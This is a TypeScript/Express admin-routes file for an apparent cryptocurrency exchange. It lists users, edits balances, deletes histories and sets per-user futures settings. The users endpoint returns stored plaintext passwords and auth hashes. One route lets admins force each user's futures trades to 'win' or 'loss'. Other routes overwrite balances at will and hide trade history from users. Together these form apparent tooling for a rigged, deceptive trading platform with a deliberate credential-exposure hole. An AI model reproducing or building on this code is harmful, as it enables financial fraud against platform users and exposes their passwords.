import type { Express } from "express";
import { requireAuth, requireAdmin, supabaseAdmin } from "./middleware";
import { syncManager } from "../sync-manager";
import supabase from "../supabaseClient";

// Cache for admin users data
let adminUsersCache: any = null;
let adminUsersCacheTime = 0;
const ADMIN_CACHE_DURATION = 60000; // 1 minute

export default function registerAdminRoutes(app: Express) {
  // GET /api/admin/users — merged user data with portfolio, KYC, loans, staking
  app.get("/api/admin/users", requireAuth, requireAdmin, async (req, res) => {
    try {
      const now = Date.now();
      const forceRefresh = req.query.refresh === 'true';
      
      // Return cached data if available and not force refreshing
      if (!forceRefresh && adminUsersCache && (now - adminUsersCacheTime) < ADMIN_CACHE_DURATION) {
        res.setHeader('X-Cache', 'HIT');
        return res.json({ users: adminUsersCache });
      }

      // Fetch only essential user columns
      const { data: customUsers, error: customError } = await supabase
        .from("users")
        .select("id, username, email, full_name, credit_score, is_verified, is_active, role, created_at, display_id, profile_picture, phone, futures_min_amount, futures_trade_result")
        .neq("role", "admin")
        .order("created_at", { ascending: false });

      if (customError) {
        return res.status(500).json({ message: "Failed to fetch users", error: customError.message });
      }

      const { data: passwords } = await supabaseAdmin
        .from("user_passwords")
        .select("user_id, password, plaintext_password, encrypted_at, last_updated");

      const { data: authUsers } = await supabaseAdmin.auth.admin.listUsers();

      // Fetch related data in parallel
      const [portfoliosData, tradesData, kycData, loansData, stakingData, pricesData] = await Promise.all([
        supabaseAdmin.from("portfolios").select("user_id, symbol, available, frozen"),
        supabaseAdmin.from("trades").select("user_id"),
        supabaseAdmin.from("kyc_verifications").select("user_id, status, submitted_at, reviewed_at, rejection_reason"),
        supabaseAdmin.from("loan_applications").select("user_id, amount, status"),
        supabaseAdmin.from("staking_positions").select("user_id, amount, status"),
        supabaseAdmin.from("crypto_prices").select("symbol, price, change24h, volume24h")
      ]);

      const portfolios = portfoliosData.data || [];
      const trades = tradesData.data || [];
      const kycVerifications = kycData.data || [];
      const loans = loansData.data || [];
      const staking = stakingData.data || [];
      const currentPrices = pricesData.data || [];

      const mergedUsers = customUsers.map((customUser) => {
        const authUser = authUsers?.users.find((au) => au.id === customUser.id);
        const userPassword = passwords?.find((p) => p.user_id === customUser.id);
        const userPortfolio = portfolios.filter((p) => p.user_id === customUser.id);
        const userTrades = trades.filter((t) => t.user_id === customUser.id);
        const userKyc = kycVerifications.find((k) => k.user_id === customUser.id);
        const userLoans = loans.filter((l) => l.user_id === customUser.id);
        const userStaking = staking.filter((s) => s.user_id === customUser.id);

        const totalPortfolioValue = userPortfolio.reduce((total, asset) => {
          const available = parseFloat(asset.available || "0");
          const frozen = parseFloat(asset.frozen || "0");
          const totalAmount = available + frozen;
          if (totalAmount === 0) return total;

          const priceData = currentPrices.find(
            (price) => price.symbol.toLowerCase() === asset.symbol.toLowerCase()
          );

          if (asset.symbol.toUpperCase() === "USDT") {
            return total + totalAmount;
          } else if (priceData?.price) {
            return total + totalAmount * parseFloat(priceData.price);
          }
          return total + totalAmount;
        }, 0);

        const totalLoanAmount = userLoans.reduce((total, loan) => total + parseFloat(loan.amount || "0"), 0);
        const totalStakingAmount = userStaking.reduce((total, pos) => total + parseFloat(pos.amount || "0"), 0);

        return {
          id: customUser.id,
          username: customUser.username,
          email: customUser.email,
          full_name: customUser.full_name,
          credit_score: customUser.credit_score,
          is_verified: customUser.is_verified,
          is_active: customUser.is_active,
          role: customUser.role,
          created_at: customUser.created_at,
          display_id: customUser.display_id,
          profile_picture: customUser.profile_picture,
          phone: customUser.phone,
          futures_min_amount: customUser.futures_min_amount,
          futures_trade_result: customUser.futures_trade_result,
          password: userPassword?.plaintext_password || userPassword?.password || null,
          password_hash: userPassword?.password || null,
          password_encrypted_at: userPassword?.encrypted_at || null,
          password_last_updated: userPassword?.last_updated || null,
          email_confirmed_at: authUser?.email_confirmed_at,
          last_sign_in_at: authUser?.last_sign_in_at,
          encrypted_password: (authUser as any)?.encrypted_password,
          app_metadata: authUser?.app_metadata,
          user_metadata: authUser?.user_metadata,
          portfolio: userPortfolio,
          total_portfolio_value: totalPortfolioValue,
          trade_count: userTrades.length,
          assets_count: userPortfolio.length,
          kyc_status: userKyc?.status || "not_submitted",
          kyc_submitted_at: userKyc?.submitted_at,
          kyc_reviewed_at: userKyc?.reviewed_at,
          kyc_rejection_reason: userKyc?.rejection_reason,
          loans: userLoans,
          total_loan_amount: totalLoanAmount,
          active_loans_count: userLoans.filter((l) => l.status === "approved").length,
          staking_positions: userStaking,
          total_staking_amount: totalStakingAmount,
          active_staking_count: userStaking.filter((s) => s.status === "active").length,
        };
      });

      // Update cache
      adminUsersCache = mergedUsers;
      adminUsersCacheTime = now;

      res.setHeader('X-Cache', 'MISS');
      res.setHeader('Cache-Control', 'private, max-age=60');
      res.json({ users: mergedUsers });
    } catch (err) {
      res.status(500).json({ message: "Server error", error: (err as Error).message });
    }
  });

  // POST /api/admin/user-management/:action
  app.post("/api/admin/user-management/:action", requireAuth, requireAdmin, async (req, res) => {
    try {
      const { action } = req.params;
      const { userId } = req.body;

      if (!userId) {
        return res.status(400).json({ message: "User ID is required" });
      }

      const { data: targetUser, error: targetUserError } = await supabaseAdmin
        .from("users")
        .select("id, email")
        .eq("id", userId)
        .single();

      if (targetUserError || !targetUser) {
        return res.status(404).json({ message: "User not found" });
      }

      let message;

      switch (action) {
        case "delete-trades": {
          const { error } = await supabaseAdmin
            .from("trades")
            .update({ deleted_for_user: true })
            .eq("user_id", userId);
          if (error) return res.status(500).json({ message: "Failed to delete trade history" });
          syncManager.syncTradesDeleted(userId);
          message = "Trade history deleted successfully (hidden from user view)";
          break;
        }

        case "delete-transactions": {
          const { error } = await supabaseAdmin.from("transactions").delete().eq("user_id", userId);
          if (error) return res.status(500).json({ message: "Failed to delete transaction history" });
          syncManager.syncTransactionsDeleted(userId);
          message = "Transaction history deleted successfully";
          break;
        }

        case "reset-verification": {
          const { error: verificationError } = await supabaseAdmin
            .from("users")
            .update({ is_verified: false, email_confirmed_at: null })
            .eq("id", userId);
          if (verificationError) return res.status(500).json({ message: "Failed to reset verification status" });

          await supabaseAdmin.from("kyc_verifications").delete().eq("user_id", userId);
          message = "Verification status reset successfully. User will need to re-verify email and submit KYC again.";
          break;
        }

        case "delete-kyc": {
          const { error } = await supabaseAdmin.from("kyc_verifications").delete().eq("user_id", userId);
          if (error) return res.status(500).json({ message: "Failed to delete KYC data" });
          message = "KYC data deleted successfully";
          break;
        }

        case "delete-portfolio": {
          const { error } = await supabaseAdmin.from("portfolios").delete().eq("user_id", userId);
          if (error) return res.status(500).json({ message: "Failed to delete portfolio data" });
          message = "Portfolio data deleted successfully";
          break;
        }

        case "update-credit-score": {
          const { creditScore } = req.body;
          // Validate credit score
          if (creditScore === undefined || creditScore === null) {
            return res.status(400).json({ message: "Credit score is required" });
          }
          const creditScoreValue = parseInt(creditScore);
          if (isNaN(creditScoreValue) || creditScoreValue < 0 || creditScoreValue > 850) {
            return res.status(400).json({ message: "Credit score must be between 0 and 850" });
          }
          const { error } = await supabaseAdmin.from("users").update({ credit_score: creditScoreValue }).eq("id", userId);
          if (error) {
            return res.status(500).json({ message: "Failed to update credit score", error: error.message });
          }
          message = `Credit score updated to ${creditScoreValue}`;
          break;
        }

        default:
          return res.status(400).json({ message: "Invalid action" });
      }

      res.json({ message });
    } catch (error: any) {
      res.status(500).json({ message: "Server error", error: error.message });
    }
  });

  // POST /api/admin/edit-portfolio-balances
  app.post("/api/admin/edit-portfolio-balances", requireAuth, requireAdmin, async (req, res) => {
    try {
      const { userId, btcBalance, usdtBalance } = req.body;

      if (!userId || typeof btcBalance !== "number" || typeof usdtBalance !== "number") {
        return res.status(400).json({ message: "Invalid input parameters" });
      }

      // Update or create BTC balance
      const { data: existingBtc, error: btcCheckError } = await supabaseAdmin
        .from("portfolios")
        .select("id")
        .eq("user_id", userId)
        .eq("symbol", "BTC")
        .single();

      if (btcCheckError && btcCheckError.code !== "PGRST116") {
        return res.status(500).json({ message: "Failed to check BTC portfolio" });
      }

      if (existingBtc) {
        const { error } = await supabaseAdmin
          .from("portfolios")
          .update({ available: btcBalance.toString(), updated_at: new Date().toISOString() })
          .eq("user_id", userId)
          .eq("symbol", "BTC");
        if (error) return res.status(500).json({ message: "Failed to update BTC balance" });
      } else {
        const { error } = await supabaseAdmin.from("portfolios").insert({
          user_id: userId,
          symbol: "BTC",
          available: btcBalance.toString(),
          frozen: "0",
          updated_at: new Date().toISOString(),
        });
        if (error) return res.status(500).json({ message: "Failed to create BTC balance" });
      }

      // Update or create USDT balance
      const { data: existingUsdt, error: usdtCheckError } = await supabaseAdmin
        .from("portfolios")
        .select("id")
        .eq("user_id", userId)
        .eq("symbol", "USDT")
        .single();

      if (usdtCheckError && usdtCheckError.code !== "PGRST116") {
        return res.status(500).json({ message: "Failed to check USDT portfolio" });
      }

      if (existingUsdt) {
        const { error } = await supabaseAdmin
          .from("portfolios")
          .update({ available: usdtBalance.toString(), updated_at: new Date().toISOString() })
          .eq("user_id", userId)
          .eq("symbol", "USDT");
        if (error) return res.status(500).json({ message: "Failed to update USDT balance" });
      } else {
        const { error } = await supabaseAdmin.from("portfolios").insert({
          user_id: userId,
          symbol: "USDT",
          available: usdtBalance.toString(),
          frozen: "0",
          updated_at: new Date().toISOString(),
        });
        if (error) return res.status(500).json({ message: "Failed to create USDT balance" });
      }

      syncManager.syncPortfolioUpdated(userId, { btc: btcBalance, usdt: usdtBalance });
      res.json({ message: "Portfolio balances updated successfully" });
    } catch (error: any) {
      res.status(500).json({ message: "Server error", error: error.message });
    }
  });

  // GET /api/admin/portfolio-balances/:userId
  app.get("/api/admin/portfolio-balances/:userId", requireAuth, requireAdmin, async (req, res) => {
    try {
      const { userId } = req.params;

      const { data: btcPortfolio } = await supabaseAdmin
        .from("portfolios")
        .select("available")
        .eq("user_id", userId)
        .eq("symbol", "BTC")
        .single();

      const { data: usdtPortfolio } = await supabaseAdmin
        .from("portfolios")
        .select("available")
        .eq("user_id", userId)
        .eq("symbol", "USDT")
        .single();

      res.json({
        btc_balance: btcPortfolio?.available ? parseFloat(btcPortfolio.available) : 0,
        usdt_balance: usdtPortfolio?.available ? parseFloat(usdtPortfolio.available) : 0,
      });
    } catch (error: any) {
      res.status(500).json({ message: "Server error", error: error.message });
    }
  });

  // POST /api/admin/toggle-user-status
  app.post("/api/admin/toggle-user-status", requireAuth, requireAdmin, async (req, res) => {
    try {
      const { userId, isActive } = req.body;

      if (!userId || typeof isActive !== "boolean") {
        return res.status(400).json({ message: "User ID and isActive status are required" });
      }

      const { data: updatedUser, error: updateError } = await supabaseAdmin
        .from("users")
        .update({ is_active: isActive })
        .eq("id", userId)
        .select("id, email, is_active")
        .single();

      if (updateError) {
        return res.status(500).json({ message: "Failed to update user status" });
      }

      res.json({
        message: `User ${isActive ? "enabled" : "disabled"} successfully`,
        user: updatedUser,
      });
    } catch (error: any) {
      res.status(500).json({ message: "Server error", error: error.message });
    }
  });

  // POST /api/admin/cleanup-portfolio
  app.post("/api/admin/cleanup-portfolio", requireAuth, requireAdmin, async (req, res) => {
    try {
      const userId = req.body.userId;
      if (!userId) {
        return res.status(400).json({ message: "userId is required" });
      }

      // Fix NaN values
      await supabaseAdmin
        .from("portfolios")
        .update({ available: "0" })
        .eq("user_id", userId)
        .or("available.eq.NaN,available.is.null");

      const { data: portfolios, error: fetchError } = await supabaseAdmin
        .from("portfolios")
        .select("*")
        .eq("user_id", userId);

      if (fetchError) throw new Error("Failed to fetch portfolios");

      // Consolidate duplicates
      for (const symbol of ["BTC", "USDT"]) {
        const entries = portfolios.filter((p) => p.symbol === symbol);
        if (entries.length > 1) {
          const total = entries.reduce((sum, entry) => sum + (parseFloat(entry.available) || 0), 0);
          for (const entry of entries) {
            await supabaseAdmin.from("portfolios").delete().eq("id", entry.id);
          }
          await supabaseAdmin.from("portfolios").insert({
            user_id: userId,
            symbol,
            available: total.toString(),
            frozen: "0",
          });
        }
      }

      const { data: finalPortfolios } = await supabaseAdmin
        .from("portfolios")
        .select("*")
        .eq("user_id", userId);

      res.json({ message: "Portfolio cleanup completed", portfolios: finalPortfolios });
    } catch (error) {
      res.status(500).json({
        message: "Failed to cleanup portfolio",
        error: error instanceof Error ? error.message : "Unknown error",
      });
    }
  });

  // PUT /api/admin/user-futures-settings — update per-user futures trade controls
  app.put("/api/admin/user-futures-settings", requireAuth, requireAdmin, async (req, res) => {
    try {
      const { userId, futuresMinAmount, futuresTradeResult } = req.body;

      if (!userId) {
        return res.status(400).json({ message: "User ID is required" });
      }

      const updateData: any = {};

      if (futuresMinAmount !== undefined) {
        const minAmount = parseFloat(futuresMinAmount);
        if (isNaN(minAmount) || minAmount < 0) {
          return res.status(400).json({ message: "Invalid minimum amount" });
        }
        updateData.futures_min_amount = minAmount;
      }

      if (futuresTradeResult !== undefined) {
        if (futuresTradeResult !== null && futuresTradeResult !== 'win' && futuresTradeResult !== 'loss') {
          return res.status(400).json({ message: "Trade result must be null, 'win', or 'loss'" });
        }
        updateData.futures_trade_result = futuresTradeResult;
      }

      if (Object.keys(updateData).length === 0) {
        return res.status(400).json({ message: "No settings to update" });
      }

      const { data: updatedUser, error: updateError } = await supabaseAdmin
        .from("users")
        .update(updateData)
        .eq("id", userId)
        .select("id, email, futures_min_amount, futures_trade_result")
        .single();

      if (updateError) {
        return res.status(500).json({ message: "Failed to update futures settings" });
      }

      res.json({
        message: "Futures settings updated successfully",
        user: updatedUser,
      });
    } catch (error: any) {
      res.status(500).json({ message: "Server error", error: error.message });
    }
  });

  // GET /api/admin/user-futures-settings/:userId — get per-user futures settings
  app.get("/api/admin/user-futures-settings/:userId", requireAuth, requireAdmin, async (req, res) => {
    try {
      const { userId } = req.params;

      const { data: user, error } = await supabaseAdmin
        .from("users")
        .select("id, email, futures_min_amount, futures_trade_result, is_active")
        .eq("id", userId)
        .single();

      if (error || !user) {
        return res.status(404).json({ message: "User not found" });
      }

      res.json(user);
    } catch (error: any) {
      res.status(500).json({ message: "Server error", error: error.message });
    }
  });
}
